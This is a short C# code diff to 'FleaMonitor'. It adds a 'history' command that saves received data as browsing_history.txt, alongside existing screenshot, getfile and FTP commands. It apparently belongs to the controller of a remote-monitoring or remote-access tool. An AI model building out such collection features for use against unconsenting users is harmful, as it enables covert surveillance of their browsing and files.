@@ -23,8 +23,10 @@ namespace FleaMonitor.Auxiliary
         public const string CD_COMMAND = "cd";
         public const string QUIT_COMMAND = "quit";
         public const string SET_FTP_COMMAND = "setftp";
+        public const string BROWSING_HISTORY_COMMAND = "history";
 
         private static readonly string SCREENSHOT_FILENAME = "screenshot.png";
+        private static readonly string BROWSING_HISTORY_FILENAME = "browsing_history.txt";
 
         public static string? WorkingPath { get; private set; }
 
@@ -103,6 +105,11 @@ namespace FleaMonitor.Auxiliary
                 case GETFILE_COMMAND:
                     SaveByteArrayToFile(Convert.FromHexString(Encoding.UTF8.GetString(buffer)), value);
                     fleaInfo.Txt = $"File {value} saved.\n";
+                    break;
+
+                case BROWSING_HISTORY_COMMAND:
+                    SaveByteArrayToFile(buffer, BROWSING_HISTORY_FILENAME);
+                    fleaInfo.Txt = $"File {BROWSING_HISTORY_FILENAME} saved.\n";
                     break;
             }
         }
